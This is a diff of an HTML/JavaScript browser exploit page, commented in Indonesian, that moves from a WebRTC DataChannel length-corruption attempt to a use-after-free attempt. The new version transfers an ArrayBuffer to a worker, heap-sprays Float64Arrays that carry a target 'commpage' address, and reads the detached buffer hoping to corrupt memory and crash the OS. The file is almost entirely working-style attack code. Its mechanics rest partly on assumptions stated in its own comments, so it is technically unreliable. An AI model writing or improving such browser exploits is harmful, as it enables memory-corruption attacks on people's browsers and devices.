@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRTC Length Corruption Attack</title>
+    <title>WebRTC UAF Header Corruption (Transfer Focus)</title>
 </head>
 <body>
 
-    <h1>WebRTC DataChannel Length Confusion (Final Attempt)</h1>
+    <h1>WebRTC Header Corruption (Transfer Focus)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Serangan WebRTC Length Confusion...</p>
+    <p id="status">INIT: Mempersiapkan Worker dan Transfer Objek...</p>
     <div id="log-area"></div>
 
     <script>
@@ -23,9 +23,8 @@
         let peerA = null;
         let peerB = null;
         let dataChannelA = null;
-        let corruptorArray = null; // Array yang akan dirusak
-        let sprayHolders = []; 
-        let attackInterval = null;
+        let worker = null;
+        let payloadHolders = []; 
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -34,7 +33,7 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI SPRAY PAYLOAD (Mengandung Commpage Address) ---
+        // --- FUNGSI SPRAY PAYLOAD ---
         function sprayPayload() {
             log("Memulai Spraying Payload...", "log-spray");
             const SPRAY_COUNT = 1500;
@@ -44,92 +43,86 @@
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2029.0 + i; 
-                sprayHolders.push(payloadArray); 
+                payloadArray[2] = 2030.0 + i; 
+                payloadHolders.push(payloadArray); 
             }
         }
 
-        // --- FUNGSI EKSEKUSI UTAMA ---
+        // --- FUNGSI UTAMA ATTACK ---
         async function runWebRTCAttack() {
             startTime = performance.now();
-            log("Phase 1: Membuat Peer dan Array Korban.", "log-init");
+            log("Phase 1: Membuat Peer, Worker, dan Buffer Korban.", "log-init");
             
-            // Korban: TypedArray yang akan kita tempatkan di dekat buffer DataChannel
-            corruptorArray = new Uint32Array(256); // 1KB
-            corruptorArray.fill(0xAAAAAAAA);
-
+            // 1. Peer Connection Setup
             const config = { iceServers: [] }; 
             peerA = new RTCPeerConnection(config);
             peerB = new RTCPeerConnection(config);
-
             dataChannelA = peerA.createDataChannel("exploit_channel", { maxPacketLifeTime: 1, ordered: false });
-            
-            // ... (Kode ICE Exchange dan Offer/Answer sama seperti sebelumnya) ...
+
+            // 2. ICE Exchange (Wajib)
+            peerA.onicecandidate = e => peerB.addIceCandidate(e.candidate).catch(() => {});
+            peerB.onicecandidate = e => peerA.addIceCandidate(e.candidate).catch(() => {});
             const offer = await peerA.createOffer();
             await peerA.setLocalDescription(offer);
             await peerB.setRemoteDescription(peerA.localDescription);
             const answer = await peerB.createAnswer();
             await peerB.setLocalDescription(answer);
             await peerA.setRemoteDescription(peerB.localDescription);
-
             log("Phase 2: Koneksi Peer dibuat.");
 
-            // 3. Memicu Length Corruption Race
+            // 3. Worker Setup
+            worker = new Worker('worker_webrtc.js');
+            worker.postMessage({ cmd: 'setup', channel: dataChannelA }, [dataChannelA]);
+            
+            // 4. UAF Race
             dataChannelA.onopen = function() {
-                log("Phase 3: DataChannel terbuka. Memulai serangan pengiriman cepat...", "log-critical");
+                log("Phase 3: DataChannel terbuka. Memulai Transfer UAF.", "log-critical");
+
+                // Buffer Korban (Akan ditransfer ke worker)
+                const victimBuffer = new ArrayBuffer(512); 
+                const victimView = new DataView(victimBuffer);
+                victimView.setUint32(0, 0xAAAAAAAA, true); 
+
+                // Memicu Transfer Buffer (Ownership pindah ke worker)
+                worker.postMessage({ cmd: 'send', buffer: victimBuffer }, [victimBuffer]);
                 
-                // Buffer besar (4KB)
-                const sendBuffer = new ArrayBuffer(4096); 
-                const senderView = new Uint32Array(sendBuffer);
+                // --- KONDISI KRITIS UAF ---
+                // Di thread utama, buffer sekarang "detached".
+                // Namun, WebKit mungkin masih memiliki pointer ke C++ header lama.
                 
-                let sendCount = 0;
-                const MAX_SENDS = 10; 
+                // Segera setelah transfer, kita lakukan FREE/SPRAY
+                setTimeout(() => {
+                    log("Phase 4: Memicu FREE/SPRAY di Thread Utama.", "log-critical");
+                    
+                    // FREE: Hapus referensi JS yang tersisa (walaupun detached)
+                    // Tidak ada referensi eksplisit, tapi kita tetap spray
 
-                attackInterval = setInterval(() => {
-                    if (dataChannelA.readyState === 'open' && sendCount < MAX_SENDS) {
-                        // 1. Lakukan Spray di tengah pengiriman (untuk menimpa header buffer WebRTC)
-                        sprayPayload(); 
+                    // SPRAY: Menimpa lokasi header ArrayBuffer yang mungkin kosong
+                    sprayPayload(); 
+                    
+                    // Trigger Dereference (Access ArrayBuffer yang Detached/Corrupt)
+                    try {
+                        log(`Membaca victimBuffer di index 0. Status: ${victimBuffer.byteLength}`, "log-critical");
+                        // Akses DataView yang masih ada di thread utama, berharap header ArrayBuffer sudah ditimpa
+                        const crashValue = victimView.getUint32(0, true);
                         
-                        // 2. Kirim Buffer Kecil (Lebih cepat di WebRTC)
-                        dataChannelA.send(sendBuffer); 
-                        sendCount++;
-                    } else {
-                        clearInterval(attackInterval);
-                        log("Phase 4: Mengakhiri Transaksi & Memicu Trigger...", "log-critical");
-                        
-                        peerA.close();
-                        peerB.close();
-                        
-                        // 3. TRIGGER: Coba akses array korban (yang mungkin ditimpa length-nya)
-                        
-                        // Nilai yang kita inginkan untuk Length Array (Misal: 0xFFFFFFFF)
-                        const OVERFLOW_LENGTH = 0x40000000; 
+                        log(`Nilai dibaca: 0x${crashValue.toString(16)}`, "log-critical");
 
-                        // Kita ASUMSIKAN sprayPayload menimpa length array menjadi OVERFLOW_LENGTH
-                        
-                        try {
-                            log(`Membaca OOB pada index: ${corruptorArray.length + 5}`, "log-critical");
-
-                            // Jika length berhasil ditimpa, kita dapat membaca OOB
-                            // Coba baca di lokasi OOB yang seharusnya kini berisi Commpage Payload
-                            const OOB_INDEX = corruptorArray.length + 5; 
-                            const crashValue = corruptorArray[OOB_INDEX];
-                            
-                            log(`Nilai OOB dibaca: 0x${crashValue.toString(16)}`, "log-critical");
-
-                            // Jika sukses, crash akan terjadi di sini
-                            if (crashValue === LOW_WORD) {
-                                log("SUCCESS: Length Corruption dan OOB Read Berhasil!", "log-success");
-                            }
-
-                            // Trigger Final (Jika OOB Read berhasil)
-                            let finalArray = new Array(crashValue);
-                            finalArray.fill(1); // Memaksa alokasi dengan panjang Commpage
-
-                        } catch(e) {
-                            log(`JS Exception: ${e.message} - Menunggu Crash OS.`, "log-critical");
+                        // Jika crashValue adalah 0xFFFFC320, SUKSES
+                        if (crashValue === LOW_WORD) {
+                            log("SUCCESS: Header ArrayBuffer Corrupt!", "log-success");
                         }
+                        
+                        // Trigger Final
+                        if (crashValue !== 0xAAAAAAAA) {
+                             let crashObj = {};
+                             crashObj[crashValue] = 1;
+                        }
+
+                    } catch(e) {
+                         log(`JS Exception Terdeteksi: ${e.message} - Menunggu Crash OS.`, "log-critical");
                     }
+
                 }, 5); 
             };
         }
@@ -139,22 +132,13 @@
                  document.getElementById('status').textContent = 'Gagal: WebRTC tidak didukung.';
                  return;
              }
-             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Length Confusion...';
+             document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Header Corruption...';
              setTimeout(runWebRTCAttack, 50);
-             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Length Corruption.';
+             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF Header.';
         });
     </script>
     <style>
-        #log-area {
-            border: 1px solid #ccc;
-            padding: 10px;
-            margin-top: 15px;
-            max-height: 400px;
-            overflow-y: scroll;
-            font-family: monospace;
-            font-size: 12px;
-            background-color: #f9f9f9;
-        }
+        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
         .log-init { color: blue; }
         .log-info { color: black; }
         .log-spray { color: purple; }
